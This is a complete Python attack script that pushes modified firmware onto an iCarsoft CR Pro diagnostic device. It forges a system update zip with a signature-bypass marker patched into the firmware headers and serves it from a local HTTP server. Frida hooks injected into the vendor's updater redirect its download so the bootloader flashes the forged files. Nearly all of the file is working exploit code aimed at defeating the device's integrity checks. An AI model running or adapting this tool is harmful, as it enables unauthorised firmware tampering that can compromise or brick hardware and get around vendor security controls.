#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attack.py — CR Pro (iCarsoft MSDIAG) firmware-substitution attack  [VECTOR D]
============================================================================
Synthesis of all research findings into ONE executable attack.

Vector decision (from the findings):
  A) minizip CVE-2002-0059 double-free  -> NOT chosen. The exploitable zlib
     lives in the DEVICE bootloader whose zlib version is unconfirmed (needs
     disassembly); a failed trigger = watchdog reboot loop (brick). Also, on
     STM32F4/F2 a crash NEVER falls through to the ROM bootloader (no empty-
     flash fallback, no nBOOT0/BOOT_SEL option bits, pins-only boot mode).
  B) software BOOT0 flip                -> impossible (F4/F2 have no BOOT_SEL).
  C) forge sysctl.bin                   -> impossible (AES key only in device
     ROM; uniform ciphertext, no oracle, no key recovery).
  D) updater trick                      -> CHOSEN. Proven: the updater performs
     NO local cryptographic validation of downloaded zip contents (WinInet
     HTTP, Range-supported) and unzips verbatim onto E: (hb5_raw.py PoC).
     Device-side UAP signature gate is defeated by the "MOD!" marker at
     header offset 32 (magic 92 95 97 96 99 98 67 6E). sysctl.bin is the ONLY
     hard gate — so we serve it byte-identical, hash-verified against the
     device's own copy (MD5 d241db949e000122b95de14e578e0fca for this unit).

Attack:
  1. Build V20CRPRO_SYSTEM.zip  =  patched UAP_DIAGMS/UAP_MENU/UAP_OBDSYS/
     UAP_RESETGN (MOD! at +32) + UNTOUCHED sysctl.bin + EDBSFD/VDATA + OBD vdbs
     (mirrors E:\\MSDIAG tree exactly, i.e. what the updater writes to the card).
  2. Run a Range-capable HTTP server on 127.0.0.1:<port> serving that zip.
  3. Frida-hook iCarsoft_MSDIAG_PCClientKits.exe:
       - InternetOpenUrlW/A: URL containing "V20CRPRO_SYSTEM.zip" is rewritten
         to the local server. URLs containing "VersionHistory" are NEVER
         touched (that download carries the per-serial pristine sysctl.bin).
       - WriteFile/CreateFileW evidence hooks log the updater writing our
         UAP_*/sysctl/EDBSFD/VDATA files to E:.
  4. Verify: read back E:\\MSDIAG\\SYSTEM\\FIRMWARE\\UAP_DIAGMS.BIN (MOD! @32)
     and sysctl.bin (SHA-256 == source) if the card is mounted.

Run (copy to the remote PC, C:\\Users\\kaang\\Desktop\\crpro_toolkit\\):
    python attack.py                         # build zip + run attack
    python attack.py --dry-run               # build + self-test zip only
    python attack.py --attach                # attach to already-running updater
    python attack.py --hook-connect --api-host login.icarsoft.com
                                             # also redirect MFC CHttpFile path
Exit codes: 0 = attack success, 1 = failed, 2 = environment error.
"""

import argparse
import hashlib
import json
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
import zipfile

try:
    import frida
except ImportError:
    frida = None  # py_compile-safe; main() reports a clear error if needed

# ---------------------------------------------------------------------------
# Constants (no machine-specific absolute paths — everything is discovered)
# ---------------------------------------------------------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
UPDATER_DEFAULT = r"C:\Program Files (x86)\iCarsoft\iCarsoft_MSDIAG_PCClientKits\iCarsoft_MSDIAG_PCClientKits.exe"
PROC_NAME = "iCarsoft_MSDIAG_PCClientKits.exe"
DOWNLOADS_DIR = r"C:\Program Files (x86)\iCarsoft\iCarsoft_MSDIAG_PCClientKits\DownLoadSoftList"
ZIP_NAME = "V20CRPRO_SYSTEM.zip"
MOD = b"MOD!"
UAP_MAGIC = bytes([0x92, 0x95, 0x97, 0x96, 0x99, 0x98, 0x67, 0x6E])
UAP_FILES = ["UAP_DIAGMS.BIN", "UAP_MENU.BIN", "UAP_OBDSYS.BIN", "UAP_RESETGN.BIN"]
KNOWN_SYSCTL_MD5 = "d241db949e000122b95de14e578e0fca"  # this unit's sysctl (info only)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 16), b""):
            h.update(chunk)
    return h.hexdigest()


def md5_file(path):
    h = hashlib.md5()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 16), b""):
            h.update(chunk)
    return h.hexdigest()


def discover_source_root():
    """Find the directory that holds the MSDIAG/ tree (works on this PC AND
    on the remote C:\\Users\\kaang\\Desktop\\crpro_toolkit)."""
    here = SCRIPT_DIR
    cands = [
        os.path.join(here, "firmware_package"),   # extracted aliyun tree (UAPs + sysctl)
        os.path.join(here, "toolkit_v4"),
        os.path.join(here, "firmware"),
        os.path.join(here, "firmware_pack", "firmware"),
        here,
        os.path.join(here, "..", "firmware_pack", "firmware"),
    ]
    for c in cands:
        if os.path.isfile(os.path.join(c, "MSDIAG", "SYSTEM", "FIRMWARE", "UAP_DIAGMS.BIN")):
            return os.path.abspath(c)
    return None


def resolve(cands):
    for c in cands:
        if os.path.isfile(c):
            return c
    return None


def patch_uap(data, name):
    """Device-side UAP gate defeat: write 'MOD!' into the signature slot at
    header offset 32 (verified bytes at 32: d3 8b fc 40 51 6b 5e 0a ...).
    DIAGMS/RESETGN carry magic 92 95 97 96 99 98 67 6E at 0; MENU/OBDSYS use
    an encrypted header (00 0C CF ... / CF CC CD CA ...) — legacy proven
    behavior patches offset 32 unconditionally for those."""
    out = bytearray(data)
    notes = []
    if len(out) < 36:
        return bytes(out), [f"{name}: TOO SMALL ({len(out)}B) — left as-is"]
    hits = 0
    if out[:8] == UAP_MAGIC:
        out[32:36] = MOD
        hits += 1
        notes.append(f"{name}: magic OK -> MOD! @ 0x20")
    else:
        idx = 0
        while True:
            idx = bytes(out).find(UAP_MAGIC, idx)
            if idx < 0:
                break
            poff = idx + 32
            if poff + 4 <= len(out):
                out[poff:poff + 4] = MOD
                hits += 1
                notes.append(f"{name}: magic @0x{idx:X} -> MOD! @0x{poff:X}")
            idx += 8
        if hits == 0:
            out[32:36] = MOD
            notes.append(f"{name}: no magic (encrypted header) -> unconditional MOD! @0x20 (legacy; VERIFY on device)")
    return bytes(out), notes


# ---------------------------------------------------------------------------
# 1. ZIP build — the concrete payload
# ---------------------------------------------------------------------------
def build_zip(src_root, out_zip, base_zip, extra_dir, version_override, old_version):
    print("=" * 62)
    print("[BUILD] Forging V20CRPRO_SYSTEM.zip (system package, softCode S0002880)")
    print("=" * 62)

    # --- 1. Base ZIP: the ORIGINAL 29-entry package (structure the updater knows) ---
    entries = {}  # zpath -> bytes, insertion order = zip order
    if base_zip and os.path.isfile(base_zip):
        with zipfile.ZipFile(base_zip) as z:
            for n in z.namelist():
                if n.endswith("/"):
                    continue
                entries[n] = z.read(n)
        print(f"[BUILD] Base ZIP: {base_zip} ({len(entries)} file entries)")
    else:
        print("[FAIL] Base ZIP not found: pass --base-zip (the original V20CRPRO_SYSTEM.zip,")
        print("       e.g. original_from_aliyun.zip — structure must match what the updater expects).")
        return None

    # --- 2. Replace the 4 UAPs with MOD!-patched versions (keeps firmware bytes!) ---
    for name in UAP_FILES:
        zpath = f"MSDIAG/SYSTEM/FIRMWARE/{name}"
        p = None
        if src_root:
            p = resolve([os.path.join(src_root, "MSDIAG", "SYSTEM", "FIRMWARE", name),
                         os.path.join(src_root, name)])
        if p:
            data, notes = patch_uap(open(p, "rb").read(), name)
            for n in notes:
                print(f"[PATCH] {n}")
            entries[zpath] = data
        elif zpath in entries:
            print(f"[WARN] {name}: no source copy — keeping BASE version (UNPATCHED)")
        else:
            print(f"[FAIL] {name}: missing in base AND source")
            return None

    # --- 3. sysctl.bin is NEVER part of the payload ---
    #     The updater fetches it per-serial from VersionHistory.zip (server side,
    #     NOT redirected) and writes it LAST — that write is the flash trigger.
    for zpath in list(entries):
        if "sysctl" in zpath.lower():
            del entries[zpath]
            print("[SYSCTL] removed from payload — server supplies the original via VersionHistory.zip")

    # --- 4. Extra dir: patched make data (MSDIAG/MAKES/... tree) ---
    if extra_dir and os.path.isdir(extra_dir):
        added = 0
        for root, dirs, files in os.walk(extra_dir):
            for f in files:
                full = os.path.join(root, f)
                rel = os.path.relpath(full, extra_dir).replace("\\", "/")
                entries[rel] = open(full, "rb").read()
                added += 1
        print(f"[EXTRA] {added} entries appended from {extra_dir}")
    else:
        print("[EXTRA] none")

    # --- 5. Write zip (base order preserved, extras appended) ---
    if os.path.exists(out_zip):
        os.remove(out_zip)
    with zipfile.ZipFile(out_zip, "w", zipfile.ZIP_DEFLATED) as z:
        for zpath, data in entries.items():
            z.writestr(zpath, data)
    # self-test: every entry must deflate cleanly
    bad = zipfile.ZipFile(out_zip).testzip()
    if bad:
        print(f"[FAIL] ZIP self-test failed on: {bad}")
        return None
    print(f"[BUILD] OK -> {out_zip} ({os.path.getsize(out_zip):,} B, {len(entries)} entries)")
    return out_zip


# ---------------------------------------------------------------------------
# 2. Range-capable raw HTTP server (WinInet sends Range requests)
# ---------------------------------------------------------------------------
class ZipServer:
    def __init__(self, zip_path, port):
        self.zip_path = zip_path
        self.port = port
        self.served = 0
        self.served_bytes = 0
        self._data = open(zip_path, "rb").read()
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        for _ in range(50):
            if self._thread.is_alive():
                return True
            time.sleep(0.1)
        return False

    def _run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("127.0.0.1", self.port))
        sock.listen(8)
        sock.settimeout(0.5)
        print(f"[SERVER] http://127.0.0.1:{self.port}/{ZIP_NAME}  ({len(self._data):,} bytes)")
        while not self._stop.is_set():
            try:
                conn, _ = sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._handle(conn)
            except Exception as e:
                print(f"[SERVER-ERR] {e}")
            finally:
                try:
                    conn.close()
                except OSError:
                    pass

    def _handle(self, conn):
        conn.settimeout(5)
        req = b""
        while b"\r\n\r\n" not in req:
            chunk = conn.recv(4096)
            if not chunk:
                return
            req += chunk
            if len(req) > 65536:
                break
        req_txt = req.decode("latin-1", errors="replace")
        head = req_txt.split("\r\n", 1)[0]
        is_head = head.upper().startswith("HEAD")
        total = len(self._data)
        start, end = 0, total - 1
        rng = None
        for line in req_txt.split("\r\n"):
            if line.lower().startswith("range: bytes="):
                rng = line.split("=", 1)[1].strip()
        if rng:
            parts = rng.split("-")
            if parts[0]:
                start = int(parts[0])
            if len(parts) > 1 and parts[1]:
                end = int(parts[1])
            else:
                end = total - 1
            if not parts[0] and parts[1]:  # suffix range bytes=-N
                start = max(0, total - int(parts[1]))
            if start > end or start >= total:
                conn.sendall(b"HTTP/1.1 416 Range Not Satisfiable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                return
            end = min(end, total - 1)
            body = self._data[start:end + 1]
            status = "206 Partial Content"
            extra = f"Content-Range: bytes {start}-{end}/{total}\r\n"
        else:
            body = self._data
            status = "200 OK"
            extra = ""
        self.served += 1
        self.served_bytes += len(body)
        print(f"[SERVED] #{self.served} {head} -> {len(body):,} bytes [{start}-{end}/{total}]")
        resp = (f"HTTP/1.1 {status}\r\n"
                f"Content-Type: application/zip\r\n"
                f"{extra}"
                f"Content-Length: {len(body)}\r\n"
                f"Accept-Ranges: bytes\r\n"
                f"Connection: close\r\n"
                f"\r\n").encode("ascii")
        conn.sendall(resp)
        if not is_head:
            conn.sendall(body)


# ---------------------------------------------------------------------------
# 3. Frida hook — redirect + evidence
# ---------------------------------------------------------------------------
HOOK_JS = r"""
var k32 = Process.findModuleByName('kernel32.dll');
var wininet = Process.findModuleByName('WININET.dll') || Process.findModuleByName('wininet.dll');

var REDIR  = 'http://127.0.0.1:__PORT__/V20CRPRO_SYSTEM.zip';
var redirW = Memory.allocUtf16String(REDIR);
var redirA = Memory.allocUtf8String(REDIR);
var hooked = false;
var handlePath = {};
var stat = {redirects: 0, eWrites: 0, uapWrites: 0, sysctlWrites: 0, misses: 0};

function log(m) { send({t: 'log', m: m}); }

function isTargetUrl(u) {
    var t = u.toLowerCase();
    if (t.indexOf('versionhistory') !== -1) return false; // pristine sysctl source — NEVER touch
    if (t.indexOf('v20crpro_system.zip') !== -1) return true;
    if (t.indexOf('v20crpro_system') !== -1 && t.indexOf('.zip') !== -1) return true;
    return false;
}

function hookAll() {
    if (hooked || !wininet) { if (!wininet && !hooked) log('WARN wininet.dll not loaded yet — retrying'); return; }
    hooked = true;

    // ===== PRIMARY: InternetOpenUrlW/A — proven interception point =====
    ['InternetOpenUrlW', 'InternetOpenUrlA'].forEach(function (nm) {
        var fn = wininet.findExportByName(nm);
        if (!fn) { log('WARN ' + nm + ' not found'); return; }
        Interceptor.attach(fn, {
            onEnter: function (a) {
                var url = a[1].isNull() ? null : (nm === 'InternetOpenUrlA' ? a[1].readUtf8String() : a[1].readUtf16String());
                if (url && isTargetUrl(url)) {
                    stat.redirects++;
                    a[1] = (nm === 'InternetOpenUrlA') ? redirA : redirW;
                    send({t: 'redirect', from: url});
                }
            }
        });
        log('HOOK ' + nm + ' installed');
    });

    // ===== OPTIONAL: MFC CHttpFile path (InternetConnectW + HttpOpenRequestW) =====
    if (__HOOK_CONNECT__) {
        var icw = wininet.findExportByName('InternetConnectW');
        if (icw) Interceptor.attach(icw, {
            onEnter: function (a) {
                var srv = a[1].isNull() ? null : a[1].readUtf16String();
                if (!srv) return;
                var t = srv.toLowerCase();
                if (t === '127.0.0.1' || t === 'localhost') return;
                var allowed = false;
                for (var i = 0; i < __API_HOSTS__.length; i++)
                    if (t.indexOf(__API_HOSTS__[i].toLowerCase()) !== -1) { allowed = true; break; }
                if (allowed) return;
                a[1] = redirW;   // host name; port stays (server binds 127.0.0.1:port)
                send({t: 'connect-redirect', from: srv});
            }
        });
        var horw = wininet.findExportByName('HttpOpenRequestW');
        if (horw) Interceptor.attach(horw, {
            onEnter: function (a) {
                var obj = a[2].isNull() ? null : a[2].readUtf16String();
                if (obj && isTargetUrl(obj)) {
                    a[2] = Memory.allocUtf16String('/' + ZIP_NAME_JS);
                    send({t: 'log', m: 'HttpOpenRequestW object rewritten: ' + obj});
                }
            }
        });
        log('HOOK connect-path installed');
    } else {
        // observe-only: tell the user if the CHttpFile path was used
        var horw2 = wininet.findExportByName('HttpOpenRequestW');
        if (horw2) Interceptor.attach(horw2, {
            onEnter: function (a) {
                var obj = a[2].isNull() ? null : a[2].readUtf16String();
                if (obj && isTargetUrl(obj)) {
                    stat.misses++;
                    log('MISSED-REDIRECT: HttpOpenRequestW(' + obj + ') — rerun with --hook-connect');
                }
            }
        });
    }

    // ===== EVIDENCE: updater writes to E: (UAP/sysctl/EDBSFD/VDATA/devinfo) =====
    var cfw = k32.findExportByName('CreateFileW');
    Interceptor.attach(cfw, {
        onEnter: function (a) {
            var p = a[0].isNull() ? null : a[0].readUtf16String();
            if (p) this.path = p;
        },
        onLeave: function (r) {
            var h = r.toInt32();
            if (this.path && h > 0 && h !== -1) handlePath[h] = this.path;
        }
    });
    var wf = k32.findExportByName('WriteFile');
    Interceptor.attach(wf, {
        onEnter: function (a) { this.h = a[0].toInt32(); this.sz = a[2].toInt32(); },
        onLeave: function () {
            var path = handlePath[this.h] || '';
            var lp = path.toLowerCase();
            if (lp.indexOf('e:\\') >= 0 &&
                (lp.indexOf('uap_') >= 0 || lp.indexOf('sysctl') >= 0 ||
                 lp.indexOf('edbsfd') >= 0 || lp.indexOf('vdata') >= 0 || lp.indexOf('devinfo') >= 0)) {
                stat.eWrites++;
                if (lp.indexOf('uap_') >= 0) stat.uapWrites++;
                if (lp.indexOf('sysctl') >= 0) stat.sysctlWrites++;
                if (stat.eWrites <= 60) log('E:WRITE ' + path + ' sz=' + this.sz);
            }
        }
    });
    log('HOOKS_READY');
}

// wininet may not be mapped yet at spawn-time in rare builds — retry briefly
var retries = 20;
(function retry() {
    if (!hooked) {
        if (!wininet) wininet = Process.findModuleByName('WININET.dll') || Process.findModuleByName('wininet.dll');
        hookAll();
        if (!hooked && retries-- > 0) setTimeout(retry, 250);
    }
})();
""".replace("__PORT__", "{PORT}").replace("__HOOK_CONNECT__", "{HOOK_CONNECT}").replace("__API_HOSTS__", "{API_HOSTS}").replace("ZIP_NAME_JS", json.dumps(ZIP_NAME))


def build_js(port, hook_connect, api_hosts):
    hosts = "[" + ",".join('"%s"' % h for h in api_hosts) + "]"
    return HOOK_JS.replace("{PORT}", str(port)).replace("{HOOK_CONNECT}", "true" if hook_connect else "false").replace("{API_HOSTS}", hosts)


# ---------------------------------------------------------------------------
# 4. Orchestration
# ---------------------------------------------------------------------------
def kill_updater():
    subprocess.run(["taskkill", "/f", "/im", PROC_NAME],
                   capture_output=True, shell=True)
    time.sleep(1.0)


def clear_download_cache():
    """Remove cached zips so the updater re-downloads (and hits our hook)."""
    if os.path.isdir(DOWNLOADS_DIR):
        for f in os.listdir(DOWNLOADS_DIR):
            if f.lower().endswith(".zip"):
                try:
                    os.remove(os.path.join(DOWNLOADS_DIR, f))
                    print(f"[CACHE] removed {f}")
                except OSError:
                    pass


def find_pid_by_name():
    try:
        for p in frida.get_local_device().enumerate_processes():
            if p.name and p.name.lower() == PROC_NAME.lower():
                return p.pid
    except Exception as e:
        print(f"[WARN] process enum failed: {e}")
    return None


def verify_card(card):
    """Best-effort read-back of E: (only mounted in upgrade mode)."""
    print("\n[CARD] read-back verification (card must be mounted):")
    results = []
    if not os.path.isdir(card + "\\"):
        print(f"[CARD] {card}: not mounted — skip (normal if device not in upgrade mode). "
              f"Unplug USB, restart device: bootloader will flash the new UAP set.")
        return None
    uap = os.path.join(card, "MSDIAG", "SYSTEM", "FIRMWARE", "UAP_DIAGMS.BIN")
    if os.path.isfile(uap):
        data = open(uap, "rb").read()
        magic_ok = data[:8] == UAP_MAGIC
        mod_ok = data[32:36] == MOD
        print(f"[CARD] UAP_DIAGMS.BIN magic={'OK' if magic_ok else 'NO'} MOD!@0x20={'OK' if mod_ok else 'NO'}")
        results.append(magic_ok and mod_ok)
    sysctl = os.path.join(card, "MSDIAG", "SYSTEM", "FIRMWARE", "sysctl.bin")
    if os.path.isfile(sysctl):
        h = sha256_file(sysctl)
        m = md5_file(sysctl)
        match = (m == KNOWN_SYSCTL_MD5)
        print(f"[CARD] sysctl.bin sha256={h[:16]}... md5={m}  ({'match known device copy' if match else 'UNKNOWN CONTENT!'})")
        results.append(match)
    else:
        print(f"[CARD] {sysctl} NOT on card yet — updater writes sysctl.bin LAST (flash trigger). "
              f"If the trigger is missing the bootloader will NOT flash.")
    return all(results) if results else None


def main():
    ap = argparse.ArgumentParser(description="CR Pro firmware-substitution attack (vector D)")
    ap.add_argument("--updater", default=UPDATER_DEFAULT, help="path to iCarsoft updater exe")
    ap.add_argument("--source-dir", default=None, help="dir containing MSDIAG/ tree (for UAP patch sources)")
    ap.add_argument("--base-zip", default=os.path.join(SCRIPT_DIR, "original_from_aliyun.zip"),
                    help="original V20CRPRO_SYSTEM.zip used as structural base")
    ap.add_argument("--extra-dir", default=os.path.join(SCRIPT_DIR, "extra"),
                    help="dir whose content is appended as zip entries (e.g. patched MSDIAG/MAKES/...)")
    ap.add_argument("--out-zip", default=os.path.join(SCRIPT_DIR, ZIP_NAME), help="output zip path")
    ap.add_argument("--port", type=int, default=9191, help="local redirect server port")
    ap.add_argument("--card", default="E:", help="card drive for read-back verification")
    ap.add_argument("--timeout", type=int, default=900, help="max seconds to wait for evidence")
    ap.add_argument("--attach", action="store_true", help="attach to running updater (no kill/spawn)")
    ap.add_argument("--hook-connect", action="store_true", help="also redirect InternetConnectW/HttpOpenRequestW path")
    ap.add_argument("--api-host", action="append", default=[], help="host NOT to redirect (repeatable)")
    ap.add_argument("--dry-run", action="store_true", help="build + self-test zip only, no frida")
    args = ap.parse_args()

    if frida is None and not args.dry_run:
        print("[FAIL] frida module not installed on this machine. Install: pip install frida-tools")
        return 2

    src_root = args.source_dir or discover_source_root()

    zip_path = build_zip(src_root, args.out_zip, args.base_zip, args.extra_dir,
                         None, "V23.02")
    if not zip_path:
        return 1
    if args.dry_run:
        print("\n[DRY-RUN] zip built and self-tested. Attack NOT run.")
        return 0

    # ---- start server ----
    server = ZipServer(zip_path, args.port)
    if not server.start():
        print(f"[FAIL] could not bind 127.0.0.1:{args.port} (port busy?)")
        return 1

    # ---- updater process ----
    if not args.attach:
        kill_updater()
        clear_download_cache()
        if not os.path.isfile(args.updater):
            print(f"[FAIL] updater exe not found: {args.updater}")
            return 1
        print(f"[FRIDA] spawning {args.updater}")
        pid = frida.spawn(args.updater)
        session = frida.attach(pid)
        resumed = False
    else:
        pid = find_pid_by_name()
        if not pid:
            print("[FAIL] updater not running; start it first, or drop --attach")
            return 1
        print(f"[FRIDA] attaching to pid {pid}")
        session = frida.attach(pid)
        resumed = True

    script = session.create_script(build_js(args.port, args.hook_connect, args.api_host))
    stats = {"redirects": 0, "eWrites": 0, "uapWrites": 0, "sysctlWrites": 0}

    def on_message(message, data):
        if message["type"] == "send":
            p = message["payload"]
            t = p.get("t", "")
            if t == "redirect":
                stats["redirects"] += 1
                print(f"[REDIRECT] #{stats['redirects']} {p['from']}")
            elif t == "connect-redirect":
                print(f"[CONNECT] host -> 127.0.0.1:{args.port} (was: {p['from']})")
            elif t == "log":
                m = p.get("m", "")
                if m.startswith("E:WRITE"):
                    stats["eWrites"] += 1
                    if "UAP_" in m:
                        stats["uapWrites"] += 1
                    if "sysctl" in m:
                        stats["sysctlWrites"] += 1
                print(f"[HOOK] {m}")
        elif message["type"] == "error":
            print(f"[SCRIPT-ERR] {message.get('description', message)}")

    script.on("message", on_message)
    script.load()
    if not resumed:
        frida.resume(pid)
        resumed = True
    print("\n>>> Login + trigger 'V20CRPRO_SYSTEM' download in the updater. Waiting for evidence... <<<\n")

    # ---- wait for evidence: the FLASH TRIGGER is sysctl.bin written LAST ----
    # (updater fetches it per-serial from VersionHistory.zip — NOT redirected —
    #  and writes it after all UAPs; without it the bootloader will not flash)
    deadline = time.time() + args.timeout
    last_status = 0
    trigger_ok = False
    while time.time() < deadline:
        time.sleep(1)
        if time.time() - last_status > 20:
            last_status = time.time()
            print(f"[STATUS] redirects={stats['redirects']} eWrites={stats['eWrites']} "
                  f"(uap={stats['uapWrites']} sysctl={stats['sysctlWrites']}) served={server.served}")
        if stats["redirects"] >= 1 and stats["sysctlWrites"] >= 1:
            time.sleep(3)  # let the updater finish the remaining writes
            trigger_ok = True
            break

    print("\n" + "=" * 62)
    if stats["redirects"] >= 1 and trigger_ok:
        print("ATTACK SUCCESS")
        print(f"  - system-firmware download redirected: {stats['redirects']}x")
        print(f"  - E: writes observed: {stats['eWrites']} (UAP={stats['uapWrites']}, "
              f"sysctl={stats['sysctlWrites']} TRIGGER OK)")
        print(f"  - forged zip served: {server.served}x requests, {server.served_bytes:,} bytes")
        verdict = 0
    elif stats["redirects"] >= 1 and stats["eWrites"] >= 1:
        print("ATTACK PARTIAL — UAPs written but sysctl.bin TRIGGER NOT observed")
        print("  sysctl.bin is the flash trigger; without it the bootloader will NOT flash.")
        print("  Do NOT unplug yet — the updater may still be processing (watch the log),")
        print("  or rerun the whole flow with a longer --timeout.")
        verdict = 1
    elif stats["redirects"] >= 1:
        print("ATTACK PARTIAL — download redirected but no E: writes observed")
        print("  (updater may still be downloading/logged out; card may not be mounted;")
        print("   or it used the CHttpFile path -> rerun with --hook-connect --api-host <login-host>)")
        verdict = 1
    else:
        print("ATTACK FAILED — no download intercepted within timeout")
        print("  - is the updater running the login + update flow?")
        print("  - if the download uses HttpOpenRequestW: rerun with --hook-connect --api-host <login-host>")
        verdict = 1

    card_result = verify_card(args.card)
    if card_result is True:
        print("[CARD] VERIFIED — card holds MOD!-patched UAP + original sysctl. Update will flash.")
    elif card_result is False:
        print("[CARD] VERIFY FAILED — read-back mismatch! Do NOT reboot the device into update; investigate.")
        verdict = 1

    print("\nNEXT STEP: unplug USB, restart device. Bootloader flashes the new UAP set (sysctl trigger).")
    print("           For STM32 RDP/firmware dump, that requires the hardware/JTAG path — out of scope here.")
    return verdict


if __name__ == "__main__":
    sys.exit(main())
